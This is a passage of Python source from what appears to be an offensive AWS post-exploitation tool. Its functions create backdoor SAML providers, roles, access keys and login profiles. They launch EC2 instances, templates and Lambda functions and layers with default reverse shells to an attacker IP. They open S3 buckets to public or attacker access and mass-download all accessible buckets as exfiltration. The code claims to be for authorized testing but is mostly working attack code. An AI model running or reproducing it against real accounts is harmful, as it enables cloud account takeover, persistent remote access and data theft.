            "description": "Provide 'saml_metadata' parameter (XML metadata document)",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_metadata",
            "resource_name": "No metadata",
            "region": "global",
            "rule_id": "iam_backdoor_saml_provider_no_metadata",
        })
        return findings

    try:
        response = client.create_saml_provider(
            SAMLMetadataDocument=saml_metadata,
            Name=provider_name
        )
        provider_arn = response["SAMLProviderArn"]

        findings.append({
            "title": f"SAML Provider Created: {provider_name}",
            "description": f"Provider ARN: {provider_arn}\nAllows federation with attacker-controlled SAML identity provider",
            "severity": "critical",
            "category": "backdoor",
            "resource_type": "iam_saml_provider",
            "resource_id": provider_arn,
            "resource_name": provider_name,
            "region": "global",
            "rule_id": "iam_backdoor_saml_provider",
            "details": {"provider_name": provider_name, "provider_arn": provider_arn},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("iam_backdoor_saml_provider", e)

    return findings


# Additional IAM BACKDOOR modules from PROWL parity
async def run_iam_backdoor_assume_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create role with trust policy allowing attacker account assumption."""
    kwargs["attacker_account"] = kwargs.get("attacker_account")
    kwargs["policy_arn"] = kwargs.get("policy_arn", "arn:aws:iam::aws:policy/AdministratorAccess")
    return await run_iam_persist_create_role(auth_manager, **kwargs)


async def run_iam_backdoor_users_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create access keys for existing users for persistent backdoor access."""
    return await run_iam_exploit_create_access_key(auth_manager, **kwargs)


async def run_iam_backdoor_users_password(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create/update console login profiles for users for backdoor access."""
    return await run_iam_persist_create_login_profile(auth_manager, **kwargs)


# EC2 EXPLOIT - Actual implementations
async def run_ec2_exploit_run_instances(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Launch EC2 instances with user data for code execution."""
    findings = []
    client = auth_manager.get_client("ec2")

    image_id = kwargs.get("image_id", "ami-0c02fb55956c7d316")  # Amazon Linux 2023 default
    instance_type = kwargs.get("instance_type", "t3.micro")
    key_name = kwargs.get("key_name")
    security_group_ids = kwargs.get("security_group_ids", [])
    subnet_id = kwargs.get("subnet_id")
    iam_instance_profile = kwargs.get("iam_instance_profile")
    user_data = kwargs.get("user_data")
    min_count = kwargs.get("min_count", 1)
    max_count = kwargs.get("max_count", 1)

    # Default user data for reverse shell if not provided
    if not user_data:
        attacker_ip = kwargs.get("attacker_ip", "1.2.3.4")
        attacker_port = kwargs.get("attacker_port", 4444)
        user_data = f"""#!/bin/bash
bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1
"""

    try:
        run_kwargs = {
            "ImageId": image_id,
            "InstanceType": instance_type,
            "MinCount": min_count,
            "MaxCount": max_count,
            "UserData": user_data,
        }

        if key_name:
            run_kwargs["KeyName"] = key_name
        if security_group_ids:
            run_kwargs["SecurityGroupIds"] = security_group_ids
        if subnet_id:
            run_kwargs["SubnetId"] = subnet_id
        if iam_instance_profile:
            run_kwargs["IamInstanceProfile"] = {"Name": iam_instance_profile}

        response = client.run_instances(**run_kwargs)

        for instance in response["Instances"]:
            instance_id = instance["InstanceId"]
            findings.append({
                "title": f"EC2 Instance Launched: {instance_id}",
                "description": f"Type: {instance_type}\nImage: {image_id}\nUser Data: {user_data[:200]}...",
                "severity": "critical",
                "category": "exploit",
                "resource_type": "ec2_instance",
                "resource_id": instance_id,
                "resource_name": instance_id,
                "region": client.meta.region_name,
                "rule_id": "ec2_exploit_run_instances",
                "details": {
                    "instance_id": instance_id,
                    "instance_type": instance_type,
                    "image_id": image_id,
                    "user_data_provided": bool(user_data),
                },
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_exploit_run_instances", e)

    return findings


async def run_ec2_exploit_modify_instance_attribute(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Modify instance attributes: user data, IAM profile, security groups."""
    findings = []
    client = auth_manager.get_client("ec2")

    instance_id = kwargs.get("instance_id")
    if not instance_id:
        findings.append({
            "title": "No Instance ID Specified",
            "description": "Provide 'instance_id' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_instance",
            "resource_name": "No instance",
            "region": client.meta.region_name,
            "rule_id": "ec2_exploit_modify_instance_attribute_no_instance",
        })
        return findings

    try:
        # Modify user data
        user_data = kwargs.get("user_data")
        if user_data:
            # Instance must be stopped to modify user data
            client.modify_instance_attribute(
                InstanceId=instance_id,
                UserData={"Value": user_data}
            )
            findings.append({
                "title": f"Instance User Data Modified: {instance_id}",
                "description": f"New user data will execute on next start: {user_data[:200]}...",
                "severity": "critical",
                "category": "persistence",
                "resource_type": "ec2_instance",
                "resource_id": instance_id,
                "resource_name": instance_id,
                "region": client.meta.region_name,
                "rule_id": "ec2_exploit_modify_user_data",
            })

        # Modify IAM instance profile
        iam_profile = kwargs.get("iam_instance_profile")
        if iam_profile:
            client.associate_iam_instance_profile(
                InstanceId=instance_id,
                IamInstanceProfile={"Name": iam_profile}
            )
            findings.append({
                "title": f"IAM Profile Attached: {instance_id}",
                "description": f"Attached IAM instance profile: {iam_profile}",
                "severity": "high",
                "category": "privilege_escalation",
                "resource_type": "ec2_instance",
                "resource_id": instance_id,
                "resource_name": instance_id,
                "region": client.meta.region_name,
                "rule_id": "ec2_exploit_attach_iam_profile",
            })

        # Modify security groups
        sg_ids = kwargs.get("security_group_ids")
        if sg_ids:
            client.modify_instance_attribute(
                InstanceId=instance_id,
                Groups=sg_ids
            )
            findings.append({
                "title": f"Security Groups Modified: {instance_id}",
                "description": f"New security groups: {', '.join(sg_ids)}",
                "severity": "high",
                "category": "network_exposure",
                "resource_type": "ec2_instance",
                "resource_id": instance_id,
                "resource_name": instance_id,
                "region": client.meta.region_name,
                "rule_id": "ec2_exploit_modify_security_groups",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_exploit_modify_instance_attribute", e)

    return findings


async def run_ec2_exploit_create_security_group(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create permissive security group for network access."""
    findings = []
    client = auth_manager.get_client("ec2")

    group_name = kwargs.get("group_name", f"awsprowl-sg-{int(datetime.now().timestamp())}")
    description = kwargs.get("description", "Security group created by awsProwl for authorized testing")
    vpc_id = kwargs.get("vpc_id")

    # Default: allow all inbound from anywhere
    ingress_rules = kwargs.get("ingress_rules", [
        {"IpProtocol": "-1", "FromPort": 0, "ToPort": 65535, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}
    ])

    try:
        if vpc_id:
            response = client.create_security_group(
                GroupName=group_name,
                Description=description,
                VpcId=vpc_id
            )
        else:
            response = client.create_security_group(
                GroupName=group_name,
                Description=description
            )

        sg_id = response["GroupId"]

        # Add ingress rules
        for rule in ingress_rules:
            client.authorize_security_group_ingress(
                GroupId=sg_id,
                IpPermissions=[rule]
            )

        findings.append({
            "title": f"Security Group Created: {sg_id} ({group_name})",
            "description": f"VPC: {vpc_id or 'default'}\nIngress rules allow broad access",
            "severity": "high",
            "category": "network_exposure",
            "resource_type": "ec2_security_group",
            "resource_id": sg_id,
            "resource_name": group_name,
            "region": client.meta.region_name,
            "rule_id": "ec2_exploit_create_security_group",
            "details": {"group_id": sg_id, "vpc_id": vpc_id, "ingress_rules": ingress_rules},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_exploit_create_security_group", e)

    return findings


async def run_ec2_exploit_create_launch_template(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create launch template with user data for persistent code execution."""
    findings = []
    client = auth_manager.get_client("ec2")

    template_name = kwargs.get("template_name", f"awsprowl-lt-{int(datetime.now().timestamp())}")
    image_id = kwargs.get("image_id", "ami-0c02fb55956c7d316")
    instance_type = kwargs.get("instance_type", "t3.micro")
    key_name = kwargs.get("key_name")
    security_group_ids = kwargs.get("security_group_ids", [])
    iam_instance_profile = kwargs.get("iam_instance_profile")
    user_data = kwargs.get("user_data")

    if not user_data:
        attacker_ip = kwargs.get("attacker_ip", "1.2.3.4")
        attacker_port = kwargs.get("attacker_port", 4444)
        user_data = f"""#!/bin/bash
bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1
"""

    try:
        # User data must be base64 encoded for AWS API
        import base64
        encoded_user_data = base64.b64encode(user_data.encode()).decode()

        launch_template_data = {
            "ImageId": image_id,
            "InstanceType": instance_type,
            "UserData": encoded_user_data,
        }

        if key_name:
            launch_template_data["KeyName"] = key_name
        if security_group_ids:
            launch_template_data["SecurityGroupIds"] = security_group_ids
        if iam_instance_profile:
            launch_template_data["IamInstanceProfile"] = {"Name": iam_instance_profile}

        response = client.create_launch_template(
            LaunchTemplateName=template_name,
            LaunchTemplateData=launch_template_data,
            VersionDescription="Launch template created by awsProwl for authorized testing"
        )

        template = response["LaunchTemplate"]
        findings.append({
            "title": f"Launch Template Created: {template['LaunchTemplateId']} ({template_name})",
            "description": f"Template for {instance_type} with user data for code execution\nVersion: {template['LatestVersionNumber']}",
            "severity": "high",
            "category": "persistence",
            "resource_type": "ec2_launch_template",
            "resource_id": template["LaunchTemplateId"],
            "resource_name": template_name,
            "region": client.meta.region_name,
            "rule_id": "ec2_exploit_create_launch_template",
            "details": {
                "template_id": template["LaunchTemplateId"],
                "template_name": template_name,
                "version": template["LatestVersionNumber"],
                "user_data_provided": bool(user_data),
            },
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_exploit_create_launch_template", e)

    return findings


# EC2 PERSIST - Actual implementations
async def run_ec2_persist_user_data(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Modify instance user data for persistent code execution on reboot."""
    # This is essentially the same as modify_instance_attribute for user data
    return await run_ec2_exploit_modify_instance_attribute(auth_manager, **kwargs)


async def run_ec2_persist_launch_template(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create launch template with user data for persistent instance deployment."""
    # Same as exploit version
    return await run_ec2_exploit_create_launch_template(auth_manager, **kwargs)


async def run_ec2_persist_ami(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create AMI with backdoored user data for persistence."""
    findings = []
    client = auth_manager.get_client("ec2")

    instance_id = kwargs.get("instance_id")
    if not instance_id:
        findings.append({
            "title": "No Instance ID Specified",
            "description": "Provide 'instance_id' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_instance",
            "resource_name": "No instance",
            "region": client.meta.region_name,
            "rule_id": "ec2_persist_ami_no_instance",
        })
        return findings

    name = kwargs.get("name", f"awsprowl-ami-{int(datetime.now().timestamp())}")
    description = kwargs.get("description", "AMI created by awsProwl for persistence")

    try:
        response = client.create_image(
            InstanceId=instance_id,
            Name=name,
            Description=description,
            NoReboot=kwargs.get("no_reboot", True)
        )

        ami_id = response["ImageId"]
        findings.append({
            "title": f"AMI Created: {ami_id} ({name})",
            "description": f"Created from instance: {instance_id}\nThis AMI contains the instance's current state including any backdoors",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "ec2_ami",
            "resource_id": ami_id,
            "resource_name": name,
            "region": client.meta.region_name,
            "rule_id": "ec2_persist_ami",
            "details": {"ami_id": ami_id, "source_instance": instance_id},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_persist_ami", e)

    return findings


# S3 EXPLOIT - Actual implementations
async def run_s3_exploit_put_bucket_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Put bucket policy to grant access."""
    findings = []
    client = auth_manager.get_client("s3")

    bucket = kwargs.get("bucket")
    if not bucket:
        findings.append({
            "title": "No Bucket Specified",
            "description": "Provide 'bucket' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_bucket",
            "resource_name": "No bucket",
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_bucket_policy_no_bucket",
        })
        return findings

    policy = kwargs.get("policy")
    if not policy:
        # Default: allow all access from attacker account
        attacker_account = kwargs.get("attacker_account")
        if attacker_account:
            policy = {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": {"AWS": f"arn:aws:iam::{attacker_account}:root"},
                    "Action": "s3:*",
                    "Resource": [f"arn:aws:s3:::{bucket}", f"arn:aws:s3:::{bucket}/*"]
                }]
            }
        else:
            # Allow public access
            policy = {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": "*",
                    "Action": "s3:*",
                    "Resource": [f"arn:aws:s3:::{bucket}", f"arn:aws:s3:::{bucket}/*"]
                }]
            }

    try:
        client.put_bucket_policy(
            Bucket=bucket,
            Policy=json.dumps(policy) if isinstance(policy, dict) else policy
        )

        findings.append({
            "title": f"Bucket Policy Applied: {bucket}",
            "description": f"Policy allows access to bucket and all objects\nPolicy: {json.dumps(policy, indent=2)}",
            "severity": "critical",
            "category": "data_exposure",
            "resource_type": "s3_bucket",
            "resource_id": bucket,
            "resource_name": bucket,
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_bucket_policy",
            "details": {"bucket": bucket, "policy": policy},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("s3_exploit_put_bucket_policy", e)

    return findings


async def run_s3_exploit_put_bucket_acl(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Put bucket ACL to grant access."""
    findings = []
    client = auth_manager.get_client("s3")

    bucket = kwargs.get("bucket")
    if not bucket:
        findings.append({
            "title": "No Bucket Specified",
            "description": "Provide 'bucket' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_bucket",
            "resource_name": "No bucket",
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_bucket_acl_no_bucket",
        })
        return findings

    # Default: grant full control to attacker account
    attacker_account = kwargs.get("attacker_account")
    grantee = {}
    if attacker_account:
        grantee = {
            "Type": "CanonicalUser",
            "ID": attacker_account  # This would need to be canonical user ID
        }
    else:
        # Grant public read
        grantee = {
            "Type": "Group",
            "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
        }

    try:
        client.put_bucket_acl(
            Bucket=bucket,
            AccessControlPolicy={
                "Grants": [{
                    "Grantee": grantee,
                    "Permission": "FULL_CONTROL"
                }],
                "Owner": {"ID": attacker_account or ""}
            }
        )

        findings.append({
            "title": f"Bucket ACL Modified: {bucket}",
            "description": f"Granted FULL_CONTROL to {attacker_account or 'AllUsers'}",
            "severity": "high",
            "category": "data_exposure",
            "resource_type": "s3_bucket",
            "resource_id": bucket,
            "resource_name": bucket,
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_bucket_acl",
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("s3_exploit_put_bucket_acl", e)

    return findings


async def run_s3_exploit_put_object(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Upload object to S3 bucket."""
    findings = []
    client = auth_manager.get_client("s3")

    bucket = kwargs.get("bucket")
    key = kwargs.get("key")
    body = kwargs.get("body", "File uploaded by awsProwl for authorized testing")
    content_type = kwargs.get("content_type", "text/plain")

    if not bucket or not key:
        findings.append({
            "title": "Missing Parameters",
            "description": "Provide 'bucket' and 'key' parameters",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "missing_params",
            "resource_name": "Missing parameters",
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_object_missing",
        })
        return findings

    try:
        client.put_object(
            Bucket=bucket,
            Key=key,
            Body=body if isinstance(body, bytes) else body.encode(),
            ContentType=content_type
        )

        findings.append({
            "title": f"Object Uploaded: s3://{bucket}/{key}",
            "description": f"Size: {len(body)} bytes\nContent-Type: {content_type}",
            "severity": "medium",
            "category": "exploit",
            "resource_type": "s3_object",
            "resource_id": key,
            "resource_name": key,
            "region": client.meta.region_name,
            "rule_id": "s3_exploit_put_object",
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("s3_exploit_put_object", e)

    return findings


# LAMBDA EXPLOIT - Actual implementations
async def run_lambda_exploit_create_function(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create Lambda function with malicious code."""
    findings = []
    client = auth_manager.get_client("lambda")

    function_name = kwargs.get("function_name", f"awsprowl-fn-{int(datetime.now().timestamp())}")
    runtime = kwargs.get("runtime", "python3.9")
    role_arn = kwargs.get("role_arn")
    handler = kwargs.get("handler", "index.handler")
    code = kwargs.get("code")

    if not role_arn:
        # Try to find a suitable role
        iam = auth_manager.get_client("iam")
        try:
            paginator = iam.get_paginator("list_roles")
            for page in paginator.paginate():
                for role in page.get("Roles", []):
                    if "lambda" in role["RoleName"].lower() or "awsprowl" in role["RoleName"].lower():
                        role_arn = role["Arn"]
                        break
                if role_arn:
                    break
        except Exception:
            pass

    if not role_arn:
        findings.append({
            "title": "No Lambda Role Specified",
            "description": "Provide 'role_arn' parameter with a role that has lambda:CreateFunction permission",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_role",
            "resource_name": "No role",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_create_function_no_role",
        })
        return findings

    # Default malicious code - reverse shell
    attacker_ip = kwargs.get("attacker_ip", "1.2.3.4")
    attacker_port = kwargs.get("attacker_port", 4444)
    if not code:
        code = f"""import os
import socket
import subprocess

def handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{attacker_ip}", {attacker_port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])"""

    try:
        import io
        import zipfile

        # Create zip with code
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr("index.py", code)
        zip_buffer.seek(0)

        response = client.create_function(
            FunctionName=function_name,
            Runtime=runtime,
            Role=role_arn,
            Handler=handler,
            Code={"ZipFile": zip_buffer.read()},
            Description="Function created by awsProwl for authorized testing",
            Timeout=300,
            MemorySize=128,
        )

        findings.append({
            "title": f"Lambda Function Created: {function_name}",
            "description": f"Runtime: {runtime}\nRole: {role_arn}\nHandler: {handler}\nCode contains reverse shell to {attacker_ip}:{attacker_port}",
            "severity": "critical",
            "category": "exploit",
            "resource_type": "lambda_function",
            "resource_id": function_name,
            "resource_name": function_name,
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_create_function",
            "details": {"function_arn": response["FunctionArn"], "runtime": runtime},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_exploit_create_function", e)

    return findings


async def run_lambda_exploit_update_function_code(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update Lambda function code."""
    findings = []
    client = auth_manager.get_client("lambda")

    function_name = kwargs.get("function_name")
    if not function_name:
        findings.append({
            "title": "No Function Name Specified",
            "description": "Provide 'function_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_function",
            "resource_name": "No function",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_update_function_code_no_function",
        })
        return findings

    code = kwargs.get("code")
    if not code:
        attacker_ip = kwargs.get("attacker_ip", "1.2.3.4")
        attacker_port = kwargs.get("attacker_port", 4444)
        code = f"""
import os
import socket
import subprocess

def handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{attacker_ip}", {attacker_port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
"""

    try:
        import zipfile
        import io

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr("index.py", code)
        zip_buffer.seek(0)

        response = client.update_function_code(
            FunctionName=function_name,
            ZipFile=zip_buffer.read(),
            Publish=True
        )

        findings.append({
            "title": f"Lambda Function Code Updated: {function_name}",
            "description": f"New code deployed with reverse shell\nVersion: {response['Version']}",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "lambda_function",
            "resource_id": function_name,
            "resource_name": function_name,
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_update_function_code",
            "details": {"version": response["Version"], "last_modified": response["LastModified"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_exploit_update_function_code", e)

    return findings


async def run_lambda_exploit_add_permission(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Add permission to Lambda function for cross-account invocation."""
    findings = []
    client = auth_manager.get_client("lambda")

    function_name = kwargs.get("function_name")
    if not function_name:
        findings.append({
            "title": "No Function Name Specified",
            "description": "Provide 'function_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_function",
            "resource_name": "No function",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_add_permission_no_function",
        })
        return findings

    principal = kwargs.get("principal")  # e.g., "arn:aws:iam::123456789012:root"
    action = kwargs.get("action", "lambda:InvokeFunction")
    statement_id = kwargs.get("statement_id", f"awsprowl-{int(datetime.now().timestamp())}")

    if not principal:
        findings.append({
            "title": "No Principal Specified",
            "description": "Provide 'principal' parameter (e.g., attacker account ARN)",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_principal",
            "resource_name": "No principal",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_add_permission_no_principal",
        })
        return findings

    try:
        response = client.add_permission(
            FunctionName=function_name,
            StatementId=statement_id,
            Action=action,
            Principal=principal,
        )

        findings.append({
            "title": f"Lambda Permission Added: {function_name}",
            "description": f"Principal: {principal}\nAction: {action}\nStatement: {statement_id}",
            "severity": "high",
            "category": "exploit",
            "resource_type": "lambda_function",
            "resource_id": function_name,
            "resource_name": function_name,
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_add_permission",
            "details": {"principal": principal, "action": action, "statement": response["Statement"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_exploit_add_permission", e)

    return findings


async def run_lambda_exploit_create_event_source_mapping(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create event source mapping for Lambda function."""
    findings = []
    client = auth_manager.get_client("lambda")

    function_name = kwargs.get("function_name")
    event_source_arn = kwargs.get("event_source_arn")  # e.g., SQS queue, DynamoDB stream, Kinesis stream

    if not function_name or not event_source_arn:
        findings.append({
            "title": "Missing Parameters",
            "description": "Provide 'function_name' and 'event_source_arn' parameters",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "missing_params",
            "resource_name": "Missing parameters",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_create_event_source_mapping_missing",
        })
        return findings

    try:
        response = client.create_event_source_mapping(
            FunctionName=function_name,
            EventSourceArn=event_source_arn,
            Enabled=True,
            BatchSize=kwargs.get("batch_size", 10),
            StartingPosition=kwargs.get("starting_position", "LATEST"),
        )

        findings.append({
            "title": f"Event Source Mapping Created: {response['UUID']}",
            "description": f"Function: {function_name}\nEvent Source: {event_source_arn}\nWill trigger Lambda on events",
            "severity": "high",
            "category": "exploit",
            "resource_type": "lambda_event_source_mapping",
            "resource_id": response["UUID"],
            "resource_name": f"{function_name} -> {event_source_arn}",
            "region": client.meta.region_name,
            "rule_id": "lambda_exploit_create_event_source_mapping",
            "details": {"function_name": function_name, "event_source_arn": event_source_arn, "uuid": response["UUID"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_exploit_create_event_source_mapping", e)

    return findings


# LAMBDA PERSIST - Actual implementations
async def run_lambda_persist_alias(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create Lambda alias for persistent version routing."""
    findings = []
    client = auth_manager.get_client("lambda")

    function_name = kwargs.get("function_name")
    alias_name = kwargs.get("alias_name", "awsprowl-persist")
    function_version = kwargs.get("function_version", "$LATEST")

    if not function_name:
        findings.append({
            "title": "No Function Name Specified",
            "description": "Provide 'function_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_function",
            "resource_name": "No function",
            "region": client.meta.region_name,
            "rule_id": "lambda_persist_alias_no_function",
        })
        return findings

    try:
        response = client.create_alias(
            FunctionName=function_name,
            Name=alias_name,
            FunctionVersion=function_version,
            Description="Alias created by awsProwl for persistence"
        )

        findings.append({
            "title": f"Lambda Alias Created: {alias_name} -> {function_version}",
            "description": f"Function: {function_name}\nAlias ARN: {response['AliasArn']}",
            "severity": "high",
            "category": "persistence",
            "resource_type": "lambda_alias",
            "resource_id": alias_name,
            "resource_name": f"{function_name}:{alias_name}",
            "region": client.meta.region_name,
            "rule_id": "lambda_persist_alias",
            "details": {"function_name": function_name, "alias_arn": response["AliasArn"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_persist_alias", e)

    return findings


async def run_lambda_persist_layer(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create/publish Lambda layer with persistent code."""
    findings = []
    client = auth_manager.get_client("lambda")

    layer_name = kwargs.get("layer_name", f"awsprowl-layer-{int(datetime.now().timestamp())}")
    code = kwargs.get("code")
    compatible_runtimes = kwargs.get("compatible_runtimes", ["python3.9", "python3.10", "python3.11"])

    if not code:
        # Default: simple backdoor module
        code = """
# Lambda layer backdoor - import this in functions to maintain persistence
import os
import socket
import subprocess

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("1.2.3.4", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
"""

    try:
        import zipfile
        import io

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr("python/backdoor.py", code)
        zip_buffer.seek(0)

        response = client.publish_layer_version(
            LayerName=layer_name,
            Content={"ZipFile": zip_buffer.read()},
            CompatibleRuntimes=compatible_runtimes,
            Description="Layer created by awsProwl for persistence"
        )

        findings.append({
            "title": f"Lambda Layer Published: {layer_name} (v{response['Version']})",
            "description": f"Layer ARN: {response['LayerVersionArn']}\nCompatible Runtimes: {', '.join(compatible_runtimes)}",
            "severity": "high",
            "category": "persistence",
            "resource_type": "lambda_layer",
            "resource_id": f"{layer_name}:{response['Version']}",
            "resource_name": layer_name,
            "region": client.meta.region_name,
            "rule_id": "lambda_persist_layer",
            "details": {"layer_arn": response["LayerVersionArn"], "version": response["Version"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lambda_persist_layer", e)

    return findings


# EXFIL (destructive) - S3 download
async def run_s3_exfil_download_all(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download all objects from accessible S3 buckets for data exfiltration."""
    findings = []
    s3_client = auth_manager.get_client("s3")

    bucket_names = kwargs.get("bucket_names", [])
    if not bucket_names:
        # List all accessible buckets
        try:
            response = s3_client.list_buckets()
            for bucket in response.get("Buckets", []):
                bucket_names.append(bucket["Name"])
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("s3:ListBuckets", e)

    if not bucket_names:
        findings.append({
            "title": "No S3 Buckets Found",
            "description": "No accessible buckets in this account",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_buckets",
            "resource_name": "No buckets",
            "region": s3_client.meta.region_name,
            "rule_id": "s3_exfil_download_all_none",
        })
        return findings

    max_objects = kwargs.get("max_objects", 1000)
    max_size = kwargs.get("max_size", 100 * 1024 * 1024)  # 100MB per object
    prefix = kwargs.get("prefix", "")

    total_downloaded = 0
    total_size = 0

    for bucket_name in bucket_names:
        try:
            paginator = s3_client.get_paginator("list_objects_v2")
            page_iterator = paginator.paginate(Bucket=bucket_name, Prefix=prefix)

            for page in page_iterator:
                objects = page.get("Contents", [])
                for obj in objects:
                    if obj["Size"] > max_size:
                        continue

                    try:
                        response = s3_client.get_object(Bucket=bucket_name, Key=obj["Key"])
                        content = response["Body"].read()
                        total_downloaded += 1
                        total_size += len(content)

                        # Just report, don't actually store all content
                        findings.append({
                            "title": f"S3 Object Exfiltrated: {bucket_name}/{obj['Key']}",
                            "description": f"Size: {obj['Size']} bytes\nLast Modified: {obj['LastModified']}\nContent preview: {content[:200] if content else 'Empty'}",
                            "severity": "high",
                            "category": "data_exfiltration",
                            "resource_type": "s3_object",
                            "resource_id": f"{bucket_name}/{obj['Key']}",
                            "resource_name": obj["Key"],
                            "region": s3_client.meta.region_name,
                            "rule_id": "s3_exfil_download_all",
                            "details": {"bucket": bucket_name, "key": obj["Key"], "size": obj["Size"]},
                        })

                        if total_downloaded >= max_objects:
                            break
                    except botocore.exceptions.ClientError as e:
                        findings.append(_handle_aws_error(f"s3_exfil_download_all:{bucket_name}/{obj['Key']}", e)[0])

                if total_downloaded >= max_objects:
                    break

        except botocore.exceptions.ClientError as e:
            findings.append(_handle_aws_error(f"s3_exfil_download_all:{bucket_name}", e)[0])

    if total_downloaded > 0:
        findings.insert(0, {
            "title": f"S3 Mass Download Complete: {total_downloaded} objects from {len(bucket_names)} buckets",
            "description": f"Total objects: {total_downloaded}\nTotal size: {total_size} bytes\nBuckets: {', '.join(bucket_names)}\nPrefix: {prefix or 'All'}\nMax objects: {max_objects}",
            "severity": "critical",
            "category": "data_exfiltration",
            "resource_type": "s3_bucket_collection",
            "resource_id": "mass_download",
            "resource_name": "Mass S3 Download",
            "region": s3_client.meta.region_name,
            "rule_id": "s3_exfil_download_all_summary",
            "details": {"buckets": bucket_names, "total_objects": total_downloaded, "total_size": total_size},
        })

    return findings


# ==================== GENERIC HANDLERS FOR NEW PROWL PARITY MODULES ====================

# Generic read-only enum handler - calls actual scanner methods
